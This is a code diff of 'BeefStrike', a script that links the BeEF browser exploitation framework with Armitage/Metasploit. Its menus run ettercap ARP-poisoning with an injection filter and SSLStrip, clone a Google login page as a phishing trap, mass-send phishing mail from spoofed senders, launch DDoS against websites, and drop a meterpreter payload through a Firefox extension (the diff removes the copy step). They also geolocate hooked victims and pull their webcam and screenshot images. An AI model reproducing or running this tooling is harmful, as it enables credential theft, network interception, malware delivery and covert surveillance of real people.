@@ -1,28 +1,26 @@
 ############################ WARNING !!!##################################################
-##											##
-##		Before beginning to use this script, change all the			##
-##	"import" lines ... Obviously you must put the right path for each Library.	##
-##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"	##
-##	I recommend you to run both Teamserver/Metasploit and BeEF on the same host.	##
-##	>>  Find FULL pack of java libs dependencies here: http://ow.ly/jMx09           ##
-##											##
+##																						##
+##		Before beginning to use this script, change all the							    ##
+##	"import" lines ... Obviously you must put the right path for each Library.			##
+##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"		##
+##	I highly recommend you to run both Teamserver/Metasploit and BeEF on the same host.	##
+##	                                                                                	##
 ##  BeefStrike is a script for Beef and Armitage integration.                           ##
-##	Read the "README file" and watch Youtube video demo to better use it    	##
-##		http://youtube.com/mrbenygreen		[  by @TheBenyGreen  ] 		##
+##		Read the "README file" and watch Youtube video demo before use it  	        	##
+##			http://youtube.com/mrbenygreen		[	by @TheBenyGreen  ]                 ##
 ##########################################################################################
+import com.eyesopencrew.* from: /root/Desktop/BeefPack/BeefLib.jar;
+import org.apache.commons.* from: /root/Desktop/BeefPack/lib/commons-lang-2.5.jar;
+import org.apache.commons.* from: /root/Desktop/BeefPack/lib/commons-logging-1.1.3.jar;
+import org.apache.commons.* from: /root/Desktop/BeefPack/lib/commons-beanutils-1.8.3.jar;
+import org.apache.commons.* from: /root/Desktop/BeefPack/lib/commons-collections-3.2.1.jar;
+import com.itextpdf.text.* from: /root/Desktop/BeefPack/lib/itextpdf-5.5.1.jar;
+import org.apache.http.* from: /root/Desktop/BeefPack/lib/httpcore-4.3.3.jar;
+import org.apache.http.* from: /root/Desktop/BeefPack/lib/httpclient-4.3.6.jar;
+import net.sf.json.* from:  /root/Desktop/BeefPack/lib/json-lib.jar;
+import net.sf.ezmorph.* from:  /root/Desktop/BeefPack/lib/ezmorph-1.0.6.jar;
 
-import com.eyesopencrew.* from: /root/BeefPack/BeefLib.jar;
-import org.apache.commons.* from: /root/BeefPack/lib/commons-lang-2.5.jar;
-import org.apache.commons.* from: /root/BeefPack/lib/commons-logging-1.1.3.jar;
-import org.apache.commons.* from: /root/BeefPack/lib/commons-beanutils-1.8.3.jar;
-import org.apache.commons.* from: /root/BeefPack/lib/commons-collections-3.2.1.jar;
-import com.itextpdf.text.* from: /root/BeefPack/lib/itextpdf-5.5.1.jar;
-import org.apache.http.* from: /root/BeefPack/lib/httpcore-4.3.3.jar;
-import org.apache.http.* from: /root/BeefPack/lib/httpclient-4.3.6.jar;
-import net.sf.json.* from:  /root/BeefPack/lib/json-lib.jar;
-import net.sf.ezmorph.* from:  /root/BeefPack/lib/ezmorph-1.0.6.jar;
-
-###################	CORE variables	##################################################
+###################	CORE variables	###############################################
 
 #global('@beef_hosts @beef_hostsoff @beef_cmde @beef_result $key $beefUrl $user $pass');
 $lhostmsf =  lhost() ;
@@ -166,7 +164,7 @@ popup beefstrike {
 					closef($handlefilter);
 					$filterpath = file_put("infect.filter"); # file are shared :-)
 					append($console , "\cC[*] Etterfilter: file create > $filterpath");
-					$filterpath = prompt_text("Path of filter (click OK to use the generated one)","$filterpath");
+					$filterpath = prompt_text("Path of your filter","$filterpath");
 					$sslstriport = prompt_text("SSLStrip config: port 80 will be redirect to :","10000");
 					cmd($console , "etterfilter $filterpath -o html.ef"); sleep(1500);
 					cmd($console , "ettercap -T -q -i $eth0 -F html.ef -M ARP // //");
@@ -180,8 +178,10 @@ popup beefstrike {
 			}
 			item "Web Cloner"{
 				append($console, "\n[o] Help : http://blog.beefproject.com/2012/09/beef-web-cloning-beef-mass-mailing.html -- by @antisnatchor");
+				$site2clone = "http://www.microsoft.com");
 				$site2clone = prompt_text("URL to Clone : ","https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/");
 				$uripath = prompt_text("URIPATH : ","/gmail");
+				$beefcloned = $beefdemo ;
 				$beefcloned = "" . $beefUrl . "/" . $uripath . "" ;
 				$link = "" . $beefUrl . "/api/seng/clone_page?token=$key";
 				$webcloning = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"url\":\"" . $site2clone . "\", \"mount\":\"" . $uripath . "\", \"dns_spoof\": true}' -X POST "  . $link . "";
@@ -192,12 +192,13 @@ popup beefstrike {
 			    append($console, "\n[o] Help : http://blog.beefproject.com/2012/09/beef-web-cloning-beef-mass-mailing.html -- by @antisnatchor");
 				$mailtemplate = prompt_text("Mail template: ","default");
 				$mailsubject = prompt_text("Mail Subject : ","New Privacy policy");
-				$fromname = prompt_text("From : ","BeEF team");
-				$beeftraplink = prompt_text("URL of trap page : ","$beefcloned");
-				$beefspooftraplink = prompt_text("Link's Text of the trap page : ","$site2clone");
+				$fromname = prompt_text("From Name: ","BeEF team");
+				$fromaddr = prompt_text("From Address: ","beef@beef.com");
+				$beefvisuallink = prompt_text("Trap Link: ","$site2clone");
+				$beeftraplink = prompt_text("Link's Text: ","$beefcloned");
 				$recipients = prompt_text("RECIPIENTS :","\"antisnatchor@example.com\":\"Michele\",\"rsmudge@example.com\":\"Raphael\""); 
 				$link = "" . $beefUrl . "/api/seng/send_mails?token=$key" ; 
-				$sendmail = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"template\":\"" . $mailtemplate . "\",\"subject\":\"" . $mailsubject . "\",\"fromname\": \"" . $fromname . "\",\"link\": \"" . $beeftraplink . "\",\"linktext\": \"" . $beefspooftraplink . "\",\"recipients\": [{" . $recipients . "}]} ' -X POST " . $link . "" ;				
+				$sendmail = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"template\":\"" . $mailtemplate . "\",\"subject\":\"" . $mailsubject . "\",\"fromname\": \"" . $fromname . "\",\"fromaddr\": \"" . $fromaddr . "\",\"link\": \"" . $beefvisuallink . "\",\"linktext\": \"" . $beeftraplink . "\",\"recipients\": [{" . $recipients . "}]} ' -X POST " . $link . "" ;				
 			    #cmd($console , "$sendmail");
 				cmd_async("$sendmail");
 			}
@@ -239,34 +240,7 @@ popup beefstrike {
 				refresh_analyze($attackMap);
 			}
 		#menu "Beef Fu" {
-		menu "WebRTC" {
-			item "Initiate Peer" {
-				$from = prompt_text("from <zombie_ID1>: ","1"); 
-				$to = prompt_text("to <zombie_ID2>: ","2");
-				$fromto = "{\"from\":" . $from . ",\"to\":" . $to . ",\"verbose\":true}" ;
-				$link = "" . $beefUrl . "/api/webrtc/go?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
-				cmd($console, "$webrtc");
-				%h = @beef_hosts[$from]; %h2 = @beef_hosts[$to];
-				$ippeers = %h['ip']; $ippeers2 = %h2['ip'];
-				add(@peers, $ippeers) ;  add(@peers, $ippeers2) ;
-				}
-			item "Peer status" {
-				$fromto = prompt_text("Peer of <zombie_ID>: ","1");
-				$link = "" . $beefUrl . "/api/webrtc/status/" . $fromto . "?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X GET " . $link . "";
-				cmd($console, "$webrtc");
-				}
-			item "Send msg over Peer" {
-				$peer = prompt_text("Message to send over peer: ","%return window.prompt(\"Are you a Beef ?\");");
-				$from = prompt_text("from <zombie_ID1>: ","1"); 
-				$to = prompt_text("to <zombie_ID2>: ","2");
-				$fromto = "{\"from\":" . $from . ",\"to\":" . $to . ",\"message\":\"" . $peer . "\"}";
-				$link = "" . $beefUrl . "/api/webrtc/msg?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
-				cmd($console, "$webrtc"); 
-				}
-			}
+
 		item "DDoS a Website" {
 			item "GET" {
 				if ($key ne "00000000000000000000000" || $key ne "" ){
@@ -349,35 +323,9 @@ popup beefstrike {
 				$iploc = prompt_text("IP to localize ","8.8.8.8");
 				$freegeoip_url = "http://freegeoip.net/json/" . $iploc . "";
 				$maptype = "hybrid";
-				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];sleep(2000);
+				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
 				#geomap($json_freegeoip, $maptype, "Empty");
-				println($json_freegeoip);
-				
-				$js = [new JSONObject]; # retrieve location information from geobyte result.
-	$js = [JSONSerializer toJSON: "$json_freegeoip"];
-	$ipmap = [BeefRequester extractMapData: "$js", "ip"] ;
-	$country = [BeefRequester extractMapData: "$js", "country_name"] ;
-	$city = [BeefRequester extractMapData: "$js", "city"] ;
-	$lat = [BeefRequester extractMapData: "$js", "latitude"] ; 	$lon = [BeefRequester extractMapData: "$js", "longitude"] ;
-	#$latlon = [BeefRequester extractGPSData: "$js"] ;
-	$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ; 
-	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C" . $lat . "," . $lon . "&maptype=hybrid";
-	println($map_url);
-	$rndval = rand(9999); $s = "-"; $b = "/" ;
-	$mapfile = "$ipmap $+ $s $+ $rndval $+ .png" ;
-	$mapfile = "$bstrk_dir $+ $b $+ $mapfile" ;
-	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); 
-	append($console , "\n\c9[*] Informations from others geolocation service" );
-		append($console , "\n\[*] ip.pycox.com geolocation service" );
-		cmd($console , "curl http://ip.pycox.com/json/" . $ipmap . "");
-		append($console , "\n\[*] ip-api.com geolocation service" );
-		cmd($console , "curl http://ip-api.com/json/" . $ipmap . "");
-	# map tab appear only if the request is made by the user otherwise, the geo-position will be just stored.
-	$map_tab = open_image_tab("Geolocate", @(), @("No Image ? Try to Refresh Map","Map informations"));
-	set_image($map_tab, file_get("" . $mapfile . "")) ;
-				
-				
-				println("zzzzzzzzzzzzzzz");
+				geomap_notrack($json_freegeoip, $maptype, "Empty");
 				}
 			item "Geo Tracking" {
 				local('$geotrack');
@@ -554,7 +502,6 @@ popup zmb_hook {
 					$freegeoip_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt&IpAddress=" . $adr . "";
 					$maptype = "hybrid";
 					$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
-					sleep(2000);
 					geomap_notrack($json_freegeoip, $maptype, $sessidr);	
 				}
 			}
@@ -574,11 +521,7 @@ popup zmb_hook {
 			item "Clippy" {	
 				send_beefcmd_with_param($sessidr, $code_clippy,"", 1, $adr);
 				}		
-			item "XPI Dropper(FF)" {
-				$dropper = prompt_text("File to drop:","/root/meterpreter.exe");
-				cmd_async("cp " . $dropper . " " . $beefpath . "/modules/social_engineering/firefox_extension_dropper/dropper/"); sleep(1000);
-				append($console, "\n\cC[*]: File copied in dropper. This folder must have only one file to drop. Check yourself");
-				cmd($console, "ls " . $beefpath . "/modules/social_engineering/firefox_extension_dropper/dropper/");
+			item "XPI Dropper(FF)" {	
 				send_beefcmd_with_param($sessidr, $code_ffextdroper,"", 1, $adr);
 				}
 			item "HTA PowerShell(IE)" {	
@@ -730,21 +673,14 @@ popup result_hook {
 	$cmdnam = @cmdnam[0];
 	$link = "$beefUrl $+ /api/modules/ $+ $sessid $+ / $+ $cmdid $+ / $+ $rsltid $+ ?token= $+ $key";
 	item "See data (console)" {
-		if ($cmdid eq $code_webcam ) {
-			$webcamlink = "" . $beefUrl . "/demos/beefstrike/cmds/webcamshot.json" ;
-			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" " . $link . " > " . $beefUrl . "/demos/beefstrike/cmds/webcamshot.json" ;
-			cmd($console, "$send_url"); append($console, "\n"); sleep(20); 
-			webcam($webcamlink, $sessid) ; 
-		}else {
-			append($console ,"\c8 Result for :[  $cmdnam  ]"); 
-			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" " . $link . "" ;
-			cmd($console, "$send_url"); append($console, "\n"); sleep(20);
-		}
-		if ($cmdid eq $code_screenshot ) {
-			$webcamlink = "" . $beefUrl . "/demos/beefstrike/cmds/screenshot.json" ;
-			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" " . $link . " > " . $beefUrl . "/demos/beefstrike/cmds/screenshot.json" ;
-			cmd($console, "$send_url"); append($console, "\n"); sleep(20); 
-			screenshot($webcamlink , $sessid) ; 
+		append($console ,"\c8 Result for :[  $cmdnam  ]"); 
+		$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" " . $link . "" ;
+		 append($console, "\n"); sleep(20);
+			if ($cmdid eq $code_webcam ) {
+			webcam($rsltid,$sessid) ; #println("webcam");
+			}
+			if ($cmdid eq $code_screenshot ) {
+			screenshot($rsltid,$sessid) ; #println("webcam");
 			}
 		}
 	item "re-Check" {
@@ -764,10 +700,29 @@ popup result_hook {
   
 #######################################################
 sub webcam {
-	#local('$data_url $r $handle $end $rndval $jso $json_rsl $jsrs $id_result ');
-	$json_rsl = [BeefRequester BeefGetRequest: "$1"]; $rank = 3 ;
-	$rsl_data = [BeefRequester extractWebcamData: "$json_rsl, $rank"]; sleep(100);
-	cmd_async("echo " . $rsl_data . " > picture.txt ");
+	local('$data_url $r $handle $end $rndval $jso $json_rsl $jsrs $id_result ');
+	$jso = "" . $beefUrl . "/demos/beefstrike/cmds/" . $1 . "" ;
+	$json_rsl = [BeefRequester BeefGetRequest: "$jso"];
+	println($json_rsl);
+	$jsrs = [new JSONObject];
+	$jsrs = [JSONSerializer toJSON: "$json_rsl"];
+	$id_result = [[$jsrs get: "command_id"] toString];  
+	$numtof = 4 ; # Variable to scroll webcam pics from 4 to 10 when clicking Next .
+	$data_url = "$beefUrl $+ /api/modules/ $+ $sess $+ / $+ $cmid $+ / $+ $id_result $+ / $+ $numtof $+ ?token= $+ $key" ;
+	$rsl_data = [BeefRequester BeefGetRequest: "$data_url"]; sleep(100);
+	$r = [ResultList extractResults: $rsl_data] ;
+		for ($i = 0; $i < [$r size]; $i++)   {
+			$data = [ResultList extractrsltData: $rsl_data, $i, "data"];  
+		}
+	# regex $data  -- 
+	$webcam_regex = "(.*|\\s)data=\"(\\s|.*)" ; 
+	if ( $data ismatch $webcam_regex ){ replace($data, $webcam_regex, "") ;}
+	$webcam_regex2 = "(.*|\\s)\"(\\s|.*)" ; 
+	if ( $data ismatch $webcam_regex2 ){ replace($data, $webcam_regex2, "") ;}
+	$handle = openf("> picture.txt");
+	println($handle, $data);
+	closef($handle);
+	$end = file_put("picture.txt");
 	$rndval = rand(9999); $s = "-"; $b = "/" ;
 	$webcamfile = "$2 $+ $s $+ $rndval $+ .jpg" ;
 	$webcamfile = "$bstrk_dir $+ $b $+ $webcamfile" ;
@@ -775,6 +730,9 @@ sub webcam {
 	$map_tab = open_image_tab("Webcam", @(), @("Webcam Refresh"));
 	set_image($map_tab, file_get("" . $webcamfile . "")) ; 		
 	# The picture is sent as a base64 encoded JPG string
+	# Copy the base64 text into a file called picture.txt (it’ll start with /9y/ and end in ==). 
+	# Then you can decode it in the command line with the following:
+	# $ base64 -d -i picture.txt > picture.jpg
 }
 
 sub screenshot {
@@ -1484,7 +1442,7 @@ popup host_bottom {
 	item "Geolocate" {
 		$freegeoip_url = "http://freegeoip.net/json/" . $1 . "";
 		$maptype = "hybrid";
-		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"]; sleep(2000);
+		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"]; sleep(100);
 		geomap_notrack($json_freegeoip, $maptype, $l_sid);
 		#item "Tracking" {}
 		}
@@ -1550,19 +1508,12 @@ filter host_image {
 		}
 		# ICON appearance When sniper is targeting some browser. 
 		# Why ? R: Because a zombi with target icon but NO Shell is a zombi that must keep our attention.
-		# (That's means that your sniper have loose his shot.) You can take a look in line of sight to correct it and shot again.
+		# (That's means that our sniper have loose his shot.) We can take a look on line of sight to correct this shot and/or re-shot.
 		for ($i = 0; $i < size(@analyze); $i++ ) {
-			%target_dr = @analyze[$i];
-			$iptarget = %target_dr['ip'];
-			if ($iptarget eq $address ){
-				push($1, script_resource("sniper.png"));
-			}
-		}
-		# Add peer icon if WebRTC peer is enabled for this zombie
-		for ($i = 0; $i < size(@peers); $i++ ) {
-			$peer = @peers[$i];
-			if ($peer eq $address ){
-				push($1, script_resource("peer.png"));
+		%target_dr = @analyze[$i];
+		$iptarget = %target_dr['ip'];
+		if ($iptarget eq $address ){
+			push($1, script_resource("sniper.png"));
 			}
 		}
 	# add label " BeEF".
@@ -1597,26 +1548,24 @@ sub geomap {
 	@googlmap[$idmap] = %map ; $idmap = $idmap + 1 ; 	
  }
 sub geomap_notrack {
-	println($1);
 	$js = [new JSONObject]; # retrieve location information from geobyte result.
-	$js = [JSONSerializer toJSON: "$json_freegeoip"];
+	$js = [JSONSerializer toJSON: "$1"];
 	$ipmap = [BeefRequester extractMapData: "$js", "ip"] ;
 	$country = [BeefRequester extractMapData: "$js", "country_name"] ;
 	$city = [BeefRequester extractMapData: "$js", "city"] ;
 	$lat = [BeefRequester extractMapData: "$js", "latitude"] ;
 	$lon = [BeefRequester extractMapData: "$js", "longitude"] ;
-	$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ; 
+	$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ;
 	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C" . $lat . "," . $lon . "&maptype=" . $2 . "";
-	println($map_url);
 	$rndval = rand(9999); $s = "-"; $b = "/" ;
 	$mapfile = "$ipmap $+ $s $+ $rndval $+ .png" ;
 	$mapfile = "$bstrk_dir $+ $b $+ $mapfile" ;
-	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); 
+	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); sleep(1000);
 	append($console , "\n\c9[*] Informations from others geolocation service" );
 		append($console , "\n\[*] ip.pycox.com geolocation service" );
-		cmd($console , "curl http://ip.pycox.com/json/" . $ipmap . "");
+		cmd($console , "curl http://ip.pycox.com/json/" . $1 . "");
 		append($console , "\n\[*] ip-api.com geolocation service" );
-		cmd($console , "curl http://ip-api.com/json/" . $ipmap . "");
+		cmd($console , "curl http://ip-api.com/json/" . $1 . "");
 	# map tab appear only if the request is made by the user otherwise, the geo-position will be just stored.
 	$map_tab = open_image_tab("Geolocate", @(), @("No Image ? Try to Refresh Map","Map informations"));
 	set_image($map_tab, file_get("" . $mapfile . "")) ; 	
@@ -1641,7 +1590,7 @@ on tab_image_click {
 		refresh_map($1);
 		} 
 	if ($3 eq "Map informations") {
-		show_message( "IP: " . $ipmap . "\n +---------------------+\n COUNTRY: " . $country . "\n CITY: " . $city . "\n TIMEZONE: " . $timezone . "\n LAT/LON: " . $lat . "/" . $lon . "\n +---All maps are saved ---+");
+		show_message( "IP: " . $ipmap . "\n +---------------------+\n COUNTRY: " . $country . "\n Fips: " . $fips . "\n REGION: " . $region . "\n CODE: " . $codec . "\n CITY: " . $city . "\n TIMEZONE: " . $timezone . "\n CERTAINTY: " . $certainty . "\n LAT/LON: " . $lat . "/" . $lon . "\n +---All maps are saved in the loots---+");
    		} 
 	if ($3 eq "Webcam Refresh") {
 		refresh_webcam($1);
